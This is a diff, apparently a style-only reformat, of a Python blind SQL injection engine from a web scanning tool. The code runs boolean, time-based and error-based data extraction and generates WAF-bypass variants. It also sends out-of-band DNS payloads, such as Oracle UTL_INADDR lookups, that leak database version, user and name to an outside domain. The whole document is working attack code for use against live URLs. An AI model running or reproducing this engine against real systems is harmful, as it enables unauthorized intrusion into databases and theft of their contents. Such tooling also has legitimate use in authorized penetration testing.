@@ -15,6 +15,7 @@ from tools.verification_oracle import ConfidenceVoter
 
 try:
     from tools.waf_bypass import fingerprint_waf
+
     HAS_WAF = True
 except Exception:
     HAS_WAF = False
@@ -87,9 +88,9 @@ ERROR_EXTRACT_TEMPLATES = {
 }
 
 ERROR_EXTRACT_REGEX = {
-    "mysql": [r'~(.+?)[\'"]', r'~(.+?)(?:\s|$)', r'XPATH syntax error: \'(.+?)\''],
-    "mssql": [r'Conversion failed.*\'(.+?)\'', r'Conversion failed when converting'],
-    "postgresql": [r'ERROR:\s*(.+?)\.'],
+    "mysql": [r'~(.+?)[\'"]', r"~(.+?)(?:\s|$)", r"XPATH syntax error: \'(.+?)\'"],
+    "mssql": [r"Conversion failed.*\'(.+?)\'", r"Conversion failed when converting"],
+    "postgresql": [r"ERROR:\s*(.+?)\."],
 }
 
 OOB_DNS_PAYLOADS = {
@@ -99,7 +100,7 @@ OOB_DNS_PAYLOADS = {
     "oracle": "SELECT UTL_INADDR.GET_HOST_ADDRESS(CONCAT((SELECT %s FROM DUAL),'.%s')) FROM DUAL",
 }
 
-QUERY_CHARSET = string.digits + string.ascii_lowercase + string.ascii_uppercase + '.-_@/: '
+QUERY_CHARSET = string.digits + string.ascii_lowercase + string.ascii_uppercase + ".-_@/: "
 
 DEFAULT_QUERIES = {
     "version": "VERSION()",
@@ -124,6 +125,7 @@ MSSQL_QUERIES = {
 # Comparator: learns what true/false look like
 # ---------------------------------------------------------------------------
 
+
 class ResponseClassifier:
     def __init__(self, sess: "requests.Session", timeout: float):
         self.sess = sess
@@ -139,12 +141,17 @@ class ResponseClassifier:
         self.threshold = 0.2
         self.min_time_diff = 0.0
 
-    def calibrate(self, url: str, param: str, true_payload: str,
-                  false_payload: str, waf_bypass_variants: List[str] = None) -> bool:
+    def calibrate(
+        self,
+        url: str,
+        param: str,
+        true_payload: str,
+        false_payload: str,
+        waf_bypass_variants: List[str] = None,
+    ) -> bool:
         try:
             start = time.time()
-            r1 = self.sess.get(build_url(url, param, true_payload),
-                               timeout=self.timeout)
+            r1 = self.sess.get(build_url(url, param, true_payload), timeout=self.timeout)
             self.true_len = len(r1.text)
             self.true_text = r1.text
             self.baseline_time = time.time() - start
@@ -154,8 +161,7 @@ class ResponseClassifier:
                 for variant in waf_bypass_variants[:5]:
                     try:
                         start = time.time()
-                        r1 = self.sess.get(build_url(url, param, variant),
-                                           timeout=self.timeout)
+                        r1 = self.sess.get(build_url(url, param, variant), timeout=self.timeout)
                         self.true_len = len(r1.text)
                         self.true_text = r1.text
                         self.baseline_time = time.time() - start
@@ -167,8 +173,7 @@ class ResponseClassifier:
                 return False
 
         try:
-            r2 = self.sess.get(build_url(url, param, false_payload),
-                               timeout=self.timeout)
+            r2 = self.sess.get(build_url(url, param, false_payload), timeout=self.timeout)
             self.false_len = len(r2.text)
             self.false_text = r2.text
         except Exception as e:
@@ -178,8 +183,9 @@ class ResponseClassifier:
         self.calibrated = True
         return True
 
-    def calibrate_with_baseline(self, url: str, param: str,
-                                sess: "requests.Session", timeout: float) -> bool:
+    def calibrate_with_baseline(
+        self, url: str, param: str, sess: "requests.Session", timeout: float
+    ) -> bool:
         try:
             r = sess.get(build_url(url, param, "1"), timeout=timeout)
             self.baseline_len = len(r.text)
@@ -192,8 +198,7 @@ class ResponseClassifier:
         if not self.calibrated:
             return None
         try:
-            r = self.sess.get(build_url(url, param, payload),
-                              timeout=self.timeout)
+            r = self.sess.get(build_url(url, param, payload), timeout=self.timeout)
             cur_len = len(r.text)
             cur_text = r.text
 
@@ -226,11 +231,17 @@ class ResponseClassifier:
 # Blind SQLi Engine
 # ---------------------------------------------------------------------------
 
+
 class BlindInjector:
-    def __init__(self, sess: Optional["requests.Session"] = None,
-                 timeout: float = 10.0, sleep_time: int = 2,
-                 max_workers: int = 8):
+    def __init__(
+        self,
+        sess: Optional["requests.Session"] = None,
+        timeout: float = 10.0,
+        sleep_time: int = 2,
+        max_workers: int = 8,
+    ):
         import requests
+
         self.sess = sess or requests.Session()
         self.timeout = timeout
         self.sleep_time = sleep_time
@@ -264,8 +275,7 @@ class BlindInjector:
                 continue
             sleep_payload = "' OR '1'='1"
             try:
-                r = self.sess.get(build_url(url, param, sleep_payload),
-                                  timeout=self.timeout)
+                r = self.sess.get(build_url(url, param, sleep_payload), timeout=self.timeout)
                 body = r.text.lower()
                 if re.search(r"mysql|maria|sql syntax", body):
                     return "mysql"
@@ -285,8 +295,7 @@ class BlindInjector:
             payload = f"' OR {fn}-- "
             try:
                 start = time.time()
-                self.sess.get(build_url(url, param, payload),
-                              timeout=self.timeout + 3)
+                self.sess.get(build_url(url, param, payload), timeout=self.timeout + 3)
                 elapsed = time.time() - start
                 if elapsed >= self.sleep_time * 0.7:
                     return dbms
@@ -300,8 +309,7 @@ class BlindInjector:
         for _ in range(3):
             try:
                 start = time.time()
-                self.sess.get(build_url(url, param, "1"),
-                              timeout=self.timeout)
+                self.sess.get(build_url(url, param, "1"), timeout=self.timeout)
                 times.append(time.time() - start)
             except Exception:
                 pass
@@ -319,8 +327,9 @@ class BlindInjector:
         if self._req_counter % 50 == 0:
             time.sleep(1.5)
 
-    def _extract_char_bool(self, url: str, param: str, query: str,
-                           pos: int, charset: str = QUERY_CHARSET) -> Optional[str]:
+    def _extract_char_bool(
+        self, url: str, param: str, query: str, pos: int, charset: str = QUERY_CHARSET
+    ) -> Optional[str]:
         if self.dbms not in BOOL_TEMPLATES:
             return None
         eq_tpl, gt_tpl = BOOL_TEMPLATES[self.dbms]
@@ -360,8 +369,9 @@ class BlindInjector:
 
         return None
 
-    def _extract_char_time(self, url: str, param: str, query: str,
-                           pos: int, charset: str = QUERY_CHARSET) -> Optional[str]:
+    def _extract_char_time(
+        self, url: str, param: str, query: str, pos: int, charset: str = QUERY_CHARSET
+    ) -> Optional[str]:
         if self.dbms not in TIME_TEMPLATES:
             return None
         eq_tpl, gt_tpl = TIME_TEMPLATES[self.dbms]
@@ -376,8 +386,9 @@ class BlindInjector:
             gt_payload = gt_tpl % (query, pos, test_char, sleep_dur)
             try:
                 start = time.time()
-                self.sess.get(build_url(url, param, gt_payload),
-                              timeout=self.timeout + sleep_dur + 1)
+                self.sess.get(
+                    build_url(url, param, gt_payload), timeout=self.timeout + sleep_dur + 1
+                )
                 elapsed = time.time() - start
             except Exception:
                 elapsed = 0
@@ -389,8 +400,9 @@ class BlindInjector:
                 eq_payload = eq_tpl % (query, pos, test_char, sleep_dur)
                 try:
                     start = time.time()
-                    self.sess.get(build_url(url, param, eq_payload),
-                                  timeout=self.timeout + sleep_dur + 1)
+                    self.sess.get(
+                        build_url(url, param, eq_payload), timeout=self.timeout + sleep_dur + 1
+                    )
                     elapsed2 = time.time() - start
                 except Exception:
                     elapsed2 = 0
@@ -400,8 +412,7 @@ class BlindInjector:
 
         return None
 
-    def _extract_string_bool(self, url: str, param: str, query: str,
-                             max_len: int = 64) -> str:
+    def _extract_string_bool(self, url: str, param: str, query: str, max_len: int = 64) -> str:
         result = ""
         for pos in range(1, max_len + 1):
             ch = self._extract_char_bool(url, param, query, pos)
@@ -410,8 +421,7 @@ class BlindInjector:
             result += ch
         return result
 
-    def _extract_string_time(self, url: str, param: str, query: str,
-                             max_len: int = 32) -> str:
+    def _extract_string_time(self, url: str, param: str, query: str, max_len: int = 32) -> str:
         result = ""
         for pos in range(1, max_len + 1):
             ch = self._extract_char_time(url, param, query, pos)
@@ -420,8 +430,7 @@ class BlindInjector:
             result += ch
         return result
 
-    def _extract_string_parallel(self, url: str, param: str, query: str,
-                                 max_len: int = 32) -> str:
+    def _extract_string_parallel(self, url: str, param: str, query: str, max_len: int = 32) -> str:
         if self.tech == BlindTech.BOOLEAN:
             extract_fn = self._extract_char_bool
         elif self.tech == BlindTech.TIME:
@@ -468,8 +477,7 @@ class BlindInjector:
         tpl = ERROR_EXTRACT_TEMPLATES[self.dbms]
         payload = tpl % query
         try:
-            r = self.sess.get(build_url(url, param, payload),
-                              timeout=self.timeout)
+            r = self.sess.get(build_url(url, param, payload), timeout=self.timeout)
             patterns = ERROR_EXTRACT_REGEX.get(self.dbms, [])
             for pat in patterns:
                 m = re.search(pat, r.text, re.IGNORECASE)
@@ -479,18 +487,25 @@ class BlindInjector:
             logger.debug("error extract: %s", e)
         return None
 
-    def _try_dbms_queries(self, url: str, param: str, dbms: str,
-                           result: Dict,
-                           waf_bypass_variants: List[str] = None,
-                           custom_queries: Dict[str, str] = None) -> bool:
+    def _try_dbms_queries(
+        self,
+        url: str,
+        param: str,
+        dbms: str,
+        result: Dict,
+        waf_bypass_variants: List[str] = None,
+        custom_queries: Dict[str, str] = None,
+    ) -> bool:
         self.dbms = dbms
         dbms_query_map = {
             "mysql": MYSQL_QUERIES,
             "mssql": MSSQL_QUERIES,
-            "postgresql": {"version": "VERSION()", "user": "current_user",
-                           "database": "current_database()"},
-            "oracle": {"version": "VERSION()", "user": "USER",
-                       "database": "ORA_DATABASE_NAME"},
+            "postgresql": {
+                "version": "VERSION()",
+                "user": "current_user",
+                "database": "current_database()",
+            },
+            "oracle": {"version": "VERSION()", "user": "USER", "database": "ORA_DATABASE_NAME"},
         }
         queries = dict(dbms_query_map.get(dbms, DEFAULT_QUERIES))
         if custom_queries:
@@ -584,12 +599,16 @@ class BlindInjector:
         result["confidence_votes"] = voter.evidence()
         return result
 
-    def run(self, url: str, param: str,
-            queries: Dict[str, str] = None,
-            forced_dbms: str = None,
-            max_len: int = 32,
-            parallel: bool = True,
-            waf_name: Optional[str] = None) -> Dict:
+    def run(
+        self,
+        url: str,
+        param: str,
+        queries: Dict[str, str] = None,
+        forced_dbms: str = None,
+        max_len: int = 32,
+        parallel: bool = True,
+        waf_name: Optional[str] = None,
+    ) -> Dict:
         self.max_len = max_len
         result = {
             "vulnerable": False,
@@ -603,6 +622,7 @@ class BlindInjector:
         waf_bypass_variants = []
         if waf_name and HAS_WAF:
             from tools.waf_bypass import generate_sqli_payloads
+
             for raw in ["' AND 1=1-- ", "' AND 1=2-- "]:
                 variants = generate_sqli_payloads(raw, waf_name, max_payloads=5)
                 waf_bypass_variants.extend(v["payload"] for v in variants if v.get("payload"))
@@ -610,8 +630,9 @@ class BlindInjector:
 
         detected_dbms = forced_dbms or self._auto_detect_dbms(url, param)
         if detected_dbms:
-            if self._try_dbms_queries(url, param, detected_dbms, result,
-                                      waf_bypass_variants, custom_queries=queries):
+            if self._try_dbms_queries(
+                url, param, detected_dbms, result, waf_bypass_variants, custom_queries=queries
+            ):
                 self._compute_confidence(result)
                 return result
 
@@ -619,8 +640,9 @@ class BlindInjector:
             if fallback == detected_dbms:
                 continue
             logger.debug("trying fallback DBMS: %s", fallback)
-            if self._try_dbms_queries(url, param, fallback, result,
-                                      waf_bypass_variants, custom_queries=queries):
+            if self._try_dbms_queries(
+                url, param, fallback, result, waf_bypass_variants, custom_queries=queries
+            ):
                 self._compute_confidence(result)
                 return result
 
@@ -634,10 +656,16 @@ class BlindInjector:
 # OOB DNS Exfiltration
 # ---------------------------------------------------------------------------
 
-def check_oob_dns(url: str, param: str, oob_domain: str,
-                  sess: Optional["requests.Session"] = None,
-                  timeout: float = 10.0) -> Dict:
+
+def check_oob_dns(
+    url: str,
+    param: str,
+    oob_domain: str,
+    sess: Optional["requests.Session"] = None,
+    timeout: float = 10.0,
+) -> Dict:
     import requests
+
     if sess is None:
         sess = requests.Session()
     sess.verify = settings.verify_ssl
@@ -652,12 +680,19 @@ def check_oob_dns(url: str, param: str, oob_domain: str,
     if dbms not in OOB_DNS_PAYLOADS:
         return result
 
-
     query_map = {
         "mysql": {"version": "@@version", "user": "user()", "database": "database()"},
         "mssql": {"version": "@@version", "user": "suser_name()", "database": "db_name()"},
-        "postgresql": {"version": "VERSION()", "user": "current_user", "database": "current_database()"},
-        "oracle": {"version": "SELECT banner FROM v$version", "user": "user FROM dual", "database": "ora_database_name FROM dual"},
+        "postgresql": {
+            "version": "VERSION()",
+            "user": "current_user",
+            "database": "current_database()",
+        },
+        "oracle": {
+            "version": "SELECT banner FROM v$version",
+            "user": "user FROM dual",
+            "database": "ora_database_name FROM dual",
+        },
     }
 
     queries = query_map.get(dbms, {})
@@ -667,12 +702,14 @@ def check_oob_dns(url: str, param: str, oob_domain: str,
         try:
             oob_payload = tpl % (q, oob_domain)
             sess.get(build_url(url, param, oob_payload), timeout=timeout)
-            result["findings"].append({
-                "type": "oob_dns",
-                "detail": f"OOB DNS payload sent for {key} via {dbms}",
-                "query": q,
-                "oob_domain": oob_domain,
-            })
+            result["findings"].append(
+                {
+                    "type": "oob_dns",
+                    "detail": f"OOB DNS payload sent for {key} via {dbms}",
+                    "query": q,
+                    "oob_domain": oob_domain,
+                }
+            )
             result["vulnerable"] = True
         except Exception as e:
             logger.debug("oob dns %s: %s", key, e)
@@ -684,13 +721,20 @@ def check_oob_dns(url: str, param: str, oob_domain: str,
 # Compatibility: simple check that discovers blind SQli
 # ---------------------------------------------------------------------------
 
-def check(url: str, param: str, sess: Optional["requests.Session"] = None,
-          timeout: float = 10.0, post_body: bool = False,
-          post_data: dict = None,
-          waf_name: Optional[str] = None,
-          auto_detect_waf: bool = True) -> Dict:
+
+def check(
+    url: str,
+    param: str,
+    sess: Optional["requests.Session"] = None,
+    timeout: float = 10.0,
+    post_body: bool = False,
+    post_data: dict = None,
+    waf_name: Optional[str] = None,
+    auto_detect_waf: bool = True,
+) -> Dict:
     if sess is None:
         import requests
+
         sess = requests.Session()
     sess.verify = settings.verify_ssl
 
